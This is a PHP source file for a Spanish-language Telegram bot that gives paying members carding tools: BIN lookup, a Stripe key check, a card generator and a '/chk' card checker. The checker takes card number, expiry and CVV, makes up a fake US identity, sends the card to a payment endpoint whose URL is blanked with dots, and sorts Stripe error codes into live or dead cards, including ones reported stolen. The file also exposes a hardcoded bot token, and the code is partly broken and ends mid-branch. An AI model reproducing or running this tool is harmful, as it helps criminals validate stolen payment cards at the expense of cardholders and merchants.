<?php

//https://api.telegram.org/bot<token>/setwebhook?url=<url>

$botToken = "1929558096:AAGtGMMQW9P60hIdrs7oFsj-SuV7St4OzAA"; // Enter your bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];


   #COMANDO DE INICIO

    if (strpos($message, "/start") === 0 || strpos($message, "/start") === 0) {
        $message = "<b>¡Hola @$username! Lastimosamente este chat no se encuentra autorizado para usar este bot. Si estas interesado en tener acceso contacte con los Administradores.</b>";
        sendMessage($chatId, $message, $message_id);
        exit();
    }
//==[Cmds Command]==//

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info");
}

//////////////////////////////////////////////
date_default_timezone_set('America/Lima');

#ARCHIVOS REQUERIDOS

    require_once('Functions.php');

#IDS DE LOS OWNERS

    $My_ID = '1147877199'; #AQUI VA TU ID, VARIABLE NECESARIA PARA AGREGAR NUEVOS USERS O GRUPOS.

#EMPIEZA CAPTURA DE VARIABLES ENVIADOS DEL CHAT

    $update = file_get_contents('php://input');
    $update = json_decode($update, true);
    $e = print_r($update);

#VERIFICACION DE PRIVILEGIOS DE ADMIN

    if ($userId != $My_ID) {
        VerificarAdmin($userId);
    }

#COMANDOS DE ADMIN

    #COMANDO PARA AÑADIR CHATS Y PUEDAN UTILIZAR TU BOT, EJEMPLO /add 1466851830

    if (strpos($message, ".add") === 0 || strpos($message, "/add") === 0 ) {
        if ($userId != $My_ID && $Admin != true) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID || $Admin == true) {
            $Agregar = substr($message, 5);
            AñadirChatID($Agregar);
            $message_admin = "<b>¡Felicidades! Este grupo fue ascendido a la versión premium y se podrá usar Elaina sin ningún inconveniente.</b>";
            $message_user =  "<b>¡Felicidades! Este grupo fue ascendido a la versión premium y se podrá usar Elaina sin ningún inconveniente.</b>";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

    #COMANDO PARA SUBIR DE RANGO EN TU BOT, EJEMPLO /premium 1466851830

    if (strpos($message, ".premium") === 0 || strpos($message, "/premium") === 0) {
        if ($userId != $My_ID && $Admin != true) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID || $Admin == true) {
            $Agregar = substr($message, 9);
            PremiumChatID($Agregar);
            $message_admin = "Tu cuenta ha sido actualizada.\nUsuario: ". $username."\nID:". $message."";
            $message_user = "✔️ Tu cuenta fue actualizada a PREMIUM, disfruta de tu membresia con .";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

    #COMANDO PARA AÑADIR ADMIN

    if (strpos($message, "!setadmin") === 0 || strpos($message, "/setadmin") === 0) {
        if ($userId != $My_ID) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID) {
            $Agregar = substr($message, 10);
            SetAdmin($Agregar);
            $message_admin = "✔️ Cuenta actualizada a ADMINISTRADOR correctamente.";
            $message_user = "✔️ Tu cuenta fue actualizada a ADMINISTRADOR, disfruta de tu membresia con .";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

    #COMANDO PARA BANEAR USERS

    if (strpos($message, ".ban") === 0 || strpos($message, "/ban") === 0) {
        if ($userId != $My_ID && $Admin != true) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID || $Admin == true) {
            $Agregar = substr($message, 5);
            Ban($Agregar);
            $message_admin = "<b>Está cuenta ha sido baneada permanentemente de manera exitosa y no podrá volver a utilizar el bot.</b>";
            $message_user = "<b>Está cuenta ha sido baneada permanentemente de manera exitosa y no podrá volver a utilizar el bot.</b>";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

    #COMANDO PARA DESBANEAR USERS

    if (strpos($message, "!unban") === 0 || strpos($message, "/unban") === 0) {
        if ($userId != $My_ID && $Admin != true) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID || $Admin == true) {
            $Agregar = substr($message, 7);
            Unban($Agregar);
            $message_admin = "<b>Está cuenta ha sido desbaneada de manera exitosa y podrá volver a utilizar el bot.</b>";
            $message_user = "<b>Está cuenta ha sido desbaneada de manera exitosa y podrá volver a utilizar el bot.</b>";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

    #COMANDO PARA BORRAR USERS

    if (strpos($message, ".unpremium") === 0 || strpos($message, "/unpremium") === 0) {
        if ($userId != $My_ID && $Admin != true) {
            $message = "<b>No estas autorizado para hacer uso de este comando</b>";
            EnviarMensaje($chatId, $message, $message_id);
            exit();
        } elseif ($userId == $My_ID || $Admin == true) {
            $Agregar = substr($message, 8);
            Delete($Agregar);
            $message_admin = "<b>Se le ha retirado la versión premium de Elaina a este usuario de manera exitosa.</b>";
            $message_user = "<b>Se le ha retirado la versión premium de Elaina a este usuario de manera exitosa.</b>";
            EnviarMensaje($chatId, $message_admin, $message_id);
            EnviarMensaje($Agregar, $message_user, "");
            exit();
        }
    }

#COMANDOS DE USERS


    #COMANDO DE INFO

    if (strpos($message, ".info") === 0 || strpos($message, "/info") === 0) {
        $message = "ℹ️ INFO SERVICE:\nUsername: @$username\nUser ID: $userId\nChat/Group ID: $chatId";
        EnviarMensaje($chatId, $message, $message_id);
        exit();
    }

    #COMANDO PARA SABER EL TIEMPO RESTANTE DEL GRUPO
    if (strpos($message, ".mygroup") === 0 || strpos($message, "/mygroup") === 0) {
        VerificarChatID($chatId); #ESTA FUNCION VERIFICA SI EL USUARIO O GRUPO ESTA AÑADIDO PARA USAR EL BOT.
        MyGroup($chatId);
        exit();
    }

    #COMANDO PARA SABER EL TIEMPO RESTANTE DEL USER

    if (strpos($message, ".myacc") === 0 || strpos($message, "/myacc") === 0) {
        VerificarChatID($chatId); #ESTA FUNCION VERIFICA SI EL USUARIO O GRUPO ESTA AÑADIDO PARA USAR EL BOT.
        MyAccount($userId);
        exit();
    }

    #COMANDO DE BINLOOKUP /bin o !bin

    if (strpos($message, ".bin") === 0 || strpos($message, "/bin") === 0) {
        $Gateway = 'BIN Lookup'; #DEBES CAMBIAR ESTO SI USARAS OTRO COMANDO, PARA EL DE BIN DEJALO ASI.
        $Archivo = 'BinLookup.php'; #DEBES CAMBIAR ESTO POR EL NOMBRE DE TU NUEVO ARCHIVO SI ES QUE USARAS OTRO COMANDO.
        VerificarChatID($chatId); #ESTA FUNCION VERIFICA SI EL USUARIO O GRUPO ESTA AÑADIDO PARA USAR EL BOT.
        $Card = GetCard($message); #ESTA FUNCION SIRVE PARA AGARRAR LA TARJETA FUERA DEL COMANDO.
        ConsultaAPI($Archivo, $Card); #ESTA FUNCION CONSULTA A LA API DEPENDIENDO EL NOMBRE DEL ARCHIVO, EN ESTE CASO "BinLookup.php".
        Respuesta($Gateway, $Resultado, $Rank); #ESTA FUNCION SIRVE PARA VERIFICAR EL TIPO DE RESPUESTA PARA ENVIAR AL USUARIO.
        exit();
    }

    #COMANDO DE CHEQUEO DE LA CC /chk o !chk

    if (strpos($message, ".chk") === 0 || strpos($message, "/chk") === 0) {
        $Gateway = 'Stripe Auth'; #DEBES CAMBIAR ESTO SI USARAS OTRO COMANDO PARA NOMBRE DE TU GATE.
        $Archivo = 'StripeAuth.php'; #DEBES CAMBIAR ESTO POR EL NOMBRE DE TU API.
        VerificarChatID($chatId); #ESTA FUNCION VERIFICA SI EL USUARIO O GRUPO ESTA AÑADIDO PARA USAR EL BOT
        Premium();
        $Card = GetCard($message); #ESTA FUNCION SIRVE PARA AGARRAR LA TARJETA FUERA DEL COMANDO.
        ConsultaAPI($Archivo, $Card); #ESTA FUNCION CONSULTA A LA API DEPENDIENDO EL NOMBRE DEL ARCHIVO, EN ESTE CASO "BinLookup.php".
        Respuesta($Gateway, $Resultado, $Rank); #ESTA FUNCION SIRVE PARA VERIFICAR EL TIPO DE RESPUESTA PARA ENVIAR AL USUARIO.
        exit();
    }

    #COMANDO DE GENERAR CCs /gen o !gen

    if (strpos($message, ".gen") === 0 || strpos($message, "/gen") === 0) {
        $Gateway = 'CC Generator'; #DEBES CAMBIAR ESTO SI USARAS OTRO COMANDO, PARA EL DE BIN DEJALO ASI.
        $Archivo = 'CardGenerator.php'; #DEBES CAMBIAR ESTO POR EL NOMBRE DE TU NUEVO ARCHIVO SI ES QUE USARAS OTRO COMANDO.
        VerificarChatID($chatId); #ESTA FUNCION VERIFICA SI EL USUARIO O GRUPO ESTA AÑADIDO PARA USAR EL BOT.
        $Card = GetCard($message); #ESTA FUNCION SIRVE PARA AGARRAR LA TARJETA FUERA DEL COMANDO.
        ConsultaAPI($Archivo, $Card); #ESTA FUNCION CONSULTA A LA API DEPENDIENDO EL NOMBRE DEL ARCHIVO, EN ESTE CASO "BinLookup.php".
        Respuesta($Gateway, $Resultado, $Rank); #ESTA FUNCION SIRVE PARA VERIFICAR EL TIPO DE RESPUESTA PARA ENVIAR AL USUARIO.
        exit();
    }
//==[Bin Command]==//

elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
//$name = $fim['country']['name']; //// country
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'');
}
curl_close($ch);

//==RANDOM USER AGENT==//
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();


//==[Chk Command]==//

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

//===[Randomizing Details]===//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=[1st REQ]=//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '.......');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ......................',
'accept: ..........................',
'accept-encoding: .................',
'accept-language: ..................',
'content-type: .....................',
'origin: ...........................',
'referer: ..........................',
'sec-fetch-dest: ...................',
'sec-fetch-mode: ...................',
'sec-fetch-site: ...................',
'user-agent: '.$ua.'',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '.....');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//=[2nd Req]=//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, '....');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ......................',
'accept: .........................',
'accept-language: ................',
'content-type: ...................',
'origin: .........................',
'referer: ........................',
'sec-fetch-dest: .................',
'sec-fetch-mode: .................',
'sec-fetch-site: .................',
'user-agent: '.$ua.'',
'x-requested-with: XMLHttpRequest',

   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'.....');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
